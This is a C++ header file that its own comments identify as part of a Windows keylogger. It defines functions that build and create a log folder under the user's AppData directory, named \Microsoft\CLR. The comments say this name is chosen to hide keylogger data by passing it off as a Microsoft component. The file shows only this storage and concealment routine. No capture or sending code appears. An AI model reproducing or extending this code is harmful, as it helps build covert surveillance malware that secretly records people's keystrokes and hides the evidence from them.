#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>//Use environment functions
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64"

namespace IO
{
    //Create a folder where we gonna keep all the logs
    std::string GetOurPath(const bool append_separator = false)
    {//Hide keylogger data in appdata/roaming on windows
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_separator ? "\\" : "");//If append separator is true show two slashes, if not show nothing
    }

    bool MkOneDr(std::string path)//Create directory in which we will store logs
    { // If directory is not created, this function will create it, otherwise it will return false
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS; //Create directory unless it's already created
    }
}

#endif // IO_H
